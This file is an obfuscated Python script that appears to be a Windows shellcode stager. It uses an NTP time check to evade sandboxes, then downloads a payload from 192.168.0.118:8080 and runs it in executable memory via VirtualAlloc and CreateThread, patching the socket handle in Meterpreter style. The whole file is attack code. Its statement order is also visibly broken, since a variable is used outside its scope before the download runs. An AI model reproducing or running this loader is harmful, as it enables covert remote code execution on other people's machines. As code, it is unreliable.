import struct, socket, binascii, ctypes as jXDTeGPHc, random, time
import multiprocessing
eaYheenxKf = multiprocessing.cpu_count()
if eaYheenxKf >= 1:
	from time import sleep
	from socket import AF_INET, SOCK_DGRAM
	import sys
	import datetime
	import time
	import socket
	import struct
	client = socket.socket(AF_INET, SOCK_DGRAM)
	client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
	msg, address = client.recvfrom( 1024 )
	eCWOqoBkmVqZB = datetime.datetime.fromtimestamp(struct.unpack("!12I",msg)[10] - 2208988800)
	sleep(5)
	client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))
	msg, address = client.recvfrom( 1024 )
	if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - eCWOqoBkmVqZB).seconds >= 5):
		eYMwnJvdaPO, mvLybRNOK = None, None
		def xLAqUq():
			try:
				global mvLybRNOK
				mvLybRNOK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				mvLybRNOK.connect(('192.168.0.118', 8080))
				XGoOuOwBnrebv = struct.pack('<i', mvLybRNOK.fileno())
				l = struct.unpack('<i', mvLybRNOK.recv(4))[0]
				kjRKdRZrOV = b"     "
				while len(kjRKdRZrOV) < l: kjRKdRZrOV += mvLybRNOK.recv(l)
				uiMDApuJUeeQE = jXDTeGPHc.create_string_buffer(kjRKdRZrOV, len(kjRKdRZrOV))
				uiMDApuJUeeQE[0] = binascii.unhexlify('BF')
				for i in range(4): uiMDApuJUeeQE[i+1] = XGoOuOwBnrebv[i]
				return uiMDApuJUeeQE
			except: return None
		def kEFgVRIYIKzE(uhnbwtJ):
			if uhnbwtJ != None:
				ptjjVttlCrAZth = bytearray(uhnbwtJ)
		sJLFgSc = jXDTeGPHc.windll.kernel32.VirtualAlloc(jXDTeGPHc.c_int(0),jXDTeGPHc.c_int(len(ptjjVttlCrAZth)),jXDTeGPHc.c_int(0x3000),jXDTeGPHc.c_int(0x40))
		VVfBZfMfFB = (jXDTeGPHc.c_char * len(ptjjVttlCrAZth)).from_buffer(ptjjVttlCrAZth)
		jXDTeGPHc.windll.kernel32.RtlMoveMemory(jXDTeGPHc.c_int(sJLFgSc), VVfBZfMfFB, jXDTeGPHc.c_int(len(ptjjVttlCrAZth)))
		ht = jXDTeGPHc.windll.kernel32.CreateThread(jXDTeGPHc.c_int(0),jXDTeGPHc.c_int(0),jXDTeGPHc.c_int(sJLFgSc),jXDTeGPHc.c_int(0),jXDTeGPHc.c_int(0),jXDTeGPHc.pointer(jXDTeGPHc.c_int(0)))
		jXDTeGPHc.windll.kernel32.WaitForSingleObject(jXDTeGPHc.c_int(ht),jXDTeGPHc.c_int(-1))
		eYMwnJvdaPO = xLAqUq()
		kEFgVRIYIKzE(eYMwnJvdaPO)
